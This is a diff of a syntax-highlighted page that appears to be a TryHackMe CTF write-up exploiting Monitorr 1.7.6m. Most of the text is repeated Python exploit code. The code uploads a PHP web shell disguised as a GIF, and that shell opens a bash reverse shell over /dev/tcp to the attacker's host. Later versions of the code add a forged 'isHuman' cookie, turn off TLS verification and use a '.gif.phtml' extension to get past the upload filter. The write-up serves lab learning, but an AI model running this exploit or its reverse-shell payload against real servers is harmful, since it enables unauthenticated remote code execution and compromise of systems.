+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;/assets/php/upload.php&#34;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/plain, */*; q=0.01&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;X-Requested-With&#34;</span><span class="p">:</span> <span class="s2">&#34;XMLHttpRequest&#34;</span><span class="p">,</span> <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;multipart/form-data; boundary=---------------------------31046105003900160576454225745&#34;</span><span class="p">,</span> <span class="s2">&#34;Origin&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]}</span>
 
-    data = &quot;-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\&quot;fileToUpload\&quot;; filename=\&quot;she_ll.php\&quot;\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123&lt;?php shell_exec(\&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&quot;+sys.argv[2] +&quot;/&quot; + sys.argv[3] + &quot; 0&gt;&amp;1'\&quot;);\r\n\r\n-----------------------------31046105003900160576454225745--\r\n&quot;
+    <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;-----------------------------31046105003900160576454225745</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\&#34;</span><span class="s2">fileToUpload</span><span class="se">\&#34;</span><span class="s2">; filename=</span><span class="se">\&#34;</span><span class="s2">she_ll.php</span><span class="se">\&#34;\r\n</span><span class="s2">Content-Type: image/gif</span><span class="se">\r\n\r\n</span><span class="s2">GIF89a213213123&lt;?php shell_exec(</span><span class="se">\&#34;</span><span class="s2">/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/&#34;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span><span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; 0&gt;&amp;1&#39;</span><span class="se">\&#34;</span><span class="s2">);</span><span class="se">\r\n\r\n</span><span class="s2">-----------------------------31046105003900160576454225745--</span><span class="se">\r\n</span><span class="s2">&#34;</span>
 
-    requests.post(url, headers=headers, data=data)
+    <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
 
-    print (&quot;A shell script should be uploaded. Now we try to execute it&quot;)
-    url = sys.argv[1] + &quot;/assets/data/usrimg/she_ll.php&quot;
-    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;}
-    requests.get(url, headers=headers)
-</code></pre><p>From the code <code>url = sys.argv[1] + &quot;/assets/php/upload.php&quot;</code>, we get the path where the image gets uploaded.</p>
+    <span class="k">print</span> <span class="p">(</span><span class="s2">&#34;A shell script should be uploaded. Now we try to execute it&#34;</span><span class="p">)</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;/assets/data/usrimg/she_ll.php&#34;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> <span class="s2">&#34;Upgrade-Insecure-Requests&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">}</span>
+    <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</code></pre></div><p>From the code <code>url = sys.argv[1] + &quot;/assets/php/upload.php&quot;</code>, we get the path where the image gets uploaded.</p>
 <pre><code>ERROR: is not an image or exceeds the webserver’s upload size limit.
 ERROR: ../data/usrimg/ already exists.
 ERROR: was not uploaded.
@@ -376,26 +718,26 @@ requests.exceptions.SSLError: HTTPSConnectionPool(host='monitorr.robyns-petshop.
 <pre><code>r = requests.post(url, headers=headers, data=data)
 print(r.text)
 </code></pre><p>Modified exploit :</p>
-<pre><code>import requests
-import os
-import sys
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
 
-if len (sys.argv) != 4:
-	print (&quot;specify params in format: python &quot; + sys.argv[0] + &quot; target_url lhost lport&quot;)
-else:
-    url = sys.argv[1] + &quot;/assets/php/upload.php&quot;
-    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/plain, */*; q=0.01&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;, &quot;Origin&quot;: sys.argv[1], &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: sys.argv[1]}
+<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+	<span class="k">print</span> <span class="p">(</span><span class="s2">&#34;specify params in format: python &#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; target_url lhost lport&#34;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;/assets/php/upload.php&#34;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/plain, */*; q=0.01&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;X-Requested-With&#34;</span><span class="p">:</span> <span class="s2">&#34;XMLHttpRequest&#34;</span><span class="p">,</span> <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;multipart/form-data; boundary=---------------------------31046105003900160576454225745&#34;</span><span class="p">,</span> <span class="s2">&#34;Origin&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]}</span>
 
-    data = &quot;-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\&quot;fileToUpload\&quot;; filename=\&quot;she_ll.php\&quot;\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123&lt;?php shell_exec(\&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&quot;+sys.argv[2] +&quot;/&quot; + sys.argv[3] + &quot; 0&gt;&amp;1'\&quot;);\r\n\r\n-----------------------------31046105003900160576454225745--\r\n&quot;
+    <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;-----------------------------31046105003900160576454225745</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\&#34;</span><span class="s2">fileToUpload</span><span class="se">\&#34;</span><span class="s2">; filename=</span><span class="se">\&#34;</span><span class="s2">she_ll.php</span><span class="se">\&#34;\r\n</span><span class="s2">Content-Type: image/gif</span><span class="se">\r\n\r\n</span><span class="s2">GIF89a213213123&lt;?php shell_exec(</span><span class="se">\&#34;</span><span class="s2">/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/&#34;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span><span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; 0&gt;&amp;1&#39;</span><span class="se">\&#34;</span><span class="s2">);</span><span class="se">\r\n\r\n</span><span class="s2">-----------------------------31046105003900160576454225745--</span><span class="se">\r\n</span><span class="s2">&#34;</span>
 
-    r = requests.post(url, headers=headers, data=data, verify = False) # Modified
-    print(r.text) # Printing the response 
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span> <span class="c1"># Modified</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="c1"># Printing the response </span>
 
-    print (&quot;A shell script should be uploaded. Now we try to execute it&quot;)
-    url = sys.argv[1] + &quot;/assets/data/usrimg/she_ll.php&quot;
-    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;}
-    requests.get(url, headers=headers, verify = False)
-</code></pre><blockquote>
+    <span class="k">print</span> <span class="p">(</span><span class="s2">&#34;A shell script should be uploaded. Now we try to execute it&#34;</span><span class="p">)</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;/assets/data/usrimg/she_ll.php&#34;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> <span class="s2">&#34;Upgrade-Insecure-Requests&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">}</span>
+    <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
+</code></pre></div><blockquote>
 <p>Let&rsquo;s run the exploit</p>
 </blockquote>
 <pre><code>root@kali:~/Desktop/tryhackme/YOJ# python3 48980.py https://monitorr.robyns-petshop.thm/ 10.6.29.240 443
@@ -413,41 +755,41 @@ A shell script should be uploaded. Now we try to execute it
 <p>Check the 🍪 in DevTools</p>
 <p>Found a cookie called <code>isHuman</code> and value set to <code>1</code></p>
 <p>Modified exploit :</p>
-<pre><code>#!/usr/bin/python
-# -*- coding: UTF-8 -*-
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/python</span>
+<span class="c1"># -*- coding: UTF-8 -*-</span>
 
-# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)
-# Date: September 12, 2020
-# Exploit Author: Lyhin's Lab
-# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/
-# Software Link: https://github.com/Monitorr/Monitorr
-# Version: 1.7.6m
-# Tested on: Ubuntu 19
+<span class="c1"># Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)</span>
+<span class="c1"># Date: September 12, 2020</span>
+<span class="c1"># Exploit Author: Lyhin&#39;s Lab</span>
+<span class="c1"># Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/</span>
+<span class="c1"># Software Link: https://github.com/Monitorr/Monitorr</span>
+<span class="c1"># Version: 1.7.6m</span>
+<span class="c1"># Tested on: Ubuntu 19</span>
 
-import requests
-import os
-import sys
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
 
-if len (sys.argv) != 4:
-	print (&quot;specify params in format: python &quot; + sys.argv[0] + &quot; target_url lhost lport&quot;)
-else:
-    url = sys.argv[1] + &quot;/assets/php/upload.php&quot;
-    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/plain, */*; q=0.01&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;, &quot;Origin&quot;: sys.argv[1], &quot;Connection&quot;: &quot;close&quot;, &quot;Referer&quot;: sys.argv[1]}
+<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+	<span class="k">print</span> <span class="p">(</span><span class="s2">&#34;specify params in format: python &#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; target_url lhost lport&#34;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;/assets/php/upload.php&#34;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/plain, */*; q=0.01&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;X-Requested-With&#34;</span><span class="p">:</span> <span class="s2">&#34;XMLHttpRequest&#34;</span><span class="p">,</span> <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;multipart/form-data; boundary=---------------------------31046105003900160576454225745&#34;</span><span class="p">,</span> <span class="s2">&#34;Origin&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]}</span>
 
-    data = &quot;-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\&quot;fileToUpload\&quot;; filename=\&quot;she_ll.php\&quot;\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123&lt;?php shell_exec(\&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&quot;+sys.argv[2] +&quot;/&quot; + sys.argv[3] + &quot; 0&gt;&amp;1'\&quot;);\r\n\r\n-----------------------------31046105003900160576454225745--\r\n&quot;
+    <span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;-----------------------------31046105003900160576454225745</span><span class="se">\r\n</span><span class="s2">Content-Disposition: form-data; name=</span><span class="se">\&#34;</span><span class="s2">fileToUpload</span><span class="se">\&#34;</span><span class="s2">; filename=</span><span class="se">\&#34;</span><span class="s2">she_ll.php</span><span class="se">\&#34;\r\n</span><span class="s2">Content-Type: image/gif</span><span class="se">\r\n\r\n</span><span class="s2">GIF89a213213123&lt;?php shell_exec(</span><span class="se">\&#34;</span><span class="s2">/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/&#34;</span><span class="o">+</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span><span class="s2">&#34;/&#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; 0&gt;&amp;1&#39;</span><span class="se">\&#34;</span><span class="s2">);</span><span class="se">\r\n\r\n</span><span class="s2">-----------------------------31046105003900160576454225745--</span><span class="se">\r\n</span><span class="s2">&#34;</span>
 
-    cookies = {
-    &quot;isHuman&quot; : &quot;1&quot;,
-    }
+    <span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&#34;isHuman&#34;</span> <span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
+    <span class="p">}</span>
 
-    r = requests.post(url, headers=headers, data=data,verify=False,cookies = cookies)
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span><span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">)</span>
     
 
-    print (&quot;A shell script should be uploaded. Now we try to execute it&quot;)
-    url = sys.argv[1] + &quot;/assets/data/usrimg/she_ll.php&quot;
-    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;}
-    requests.get(url, headers=headers, verify=False,cookies = cookies)
-</code></pre><p>Well it worked !!</p>
+    <span class="k">print</span> <span class="p">(</span><span class="s2">&#34;A shell script should be uploaded. Now we try to execute it&#34;</span><span class="p">)</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;/assets/data/usrimg/she_ll.php&#34;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> <span class="s2">&#34;Upgrade-Insecure-Requests&#34;</span><span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">}</span>
+    <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span><span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span><span class="p">)</span>
+</code></pre></div><p>Well it worked !!</p>
 <h3 id="filter-bypass">Filter bypass</h3>
 <p>Finally we have convinced the Web application that we are human, but it&rsquo;s still not letting us to upload anything.</p>
 <ul>
@@ -459,39 +801,39 @@ else:
 </li>
 </ul>
 <p><strong>This is the final exploit</strong></p>
-<pre><code>import requests
-import os
-import sys
-import random
-import string
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">string</span>
 
-if len (sys.argv) != 4:
-	print (&quot;specify params in format: python &quot; + sys.argv[0] + &quot; target_url lhost lport&quot;)
-else:
-    url = sys.argv[1] + &quot;/assets/php/upload.php&quot;
-    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&quot;, 
-    &quot;Accept&quot;: &quot;text/plain, */*; q=0.01&quot;, 
-    &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, 
-    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;Content-Type&quot;: &quot;multipart/form-data; boundary=---------------------------31046105003900160576454225745&quot;, 
-    &quot;Origin&quot;: sys.argv[1], 
-    &quot;Connection&quot;: &quot;close&quot;, 
-    &quot;Referer&quot;: sys.argv[1]}
-    filename = &quot;&quot;.join([random.choice(string.ascii_lowercase) for _ in range(random.randint(5,12))])
+<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+	<span class="k">print</span> <span class="p">(</span><span class="s2">&#34;specify params in format: python &#34;</span> <span class="o">+</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; target_url lhost lport&#34;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;/assets/php/upload.php&#34;</span>
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;User-Agent&#34;</span><span class="p">:</span> <span class="s2">&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span><span class="p">,</span> 
+    <span class="s2">&#34;Accept&#34;</span><span class="p">:</span> <span class="s2">&#34;text/plain, */*; q=0.01&#34;</span><span class="p">,</span> 
+    <span class="s2">&#34;Accept-Language&#34;</span><span class="p">:</span> <span class="s2">&#34;en-US,en;q=0.5&#34;</span><span class="p">,</span> 
+    <span class="s2">&#34;Accept-Encoding&#34;</span><span class="p">:</span> <span class="s2">&#34;gzip, deflate&#34;</span><span class="p">,</span> <span class="s2">&#34;X-Requested-With&#34;</span><span class="p">:</span> <span class="s2">&#34;XMLHttpRequest&#34;</span><span class="p">,</span> <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;multipart/form-data; boundary=---------------------------31046105003900160576454225745&#34;</span><span class="p">,</span> 
+    <span class="s2">&#34;Origin&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> 
+    <span class="s2">&#34;Connection&#34;</span><span class="p">:</span> <span class="s2">&#34;close&#34;</span><span class="p">,</span> 
+    <span class="s2">&#34;Referer&#34;</span><span class="p">:</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]}</span>
+    <span class="n">filename</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span><span class="mi">12</span><span class="p">))])</span>
 
-    data = f&quot;-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\&quot;fileToUpload\&quot;; filename=\&quot;{filename}.gif.phtml\&quot;\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123&lt;?php shell_exec(\&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&quot;+sys.argv[2] +&quot;/&quot; + sys.argv[3] + &quot; 0&gt;&amp;1'\&quot;);\r\n\r\n-----------------------------31046105003900160576454225745--\r\n&quot;
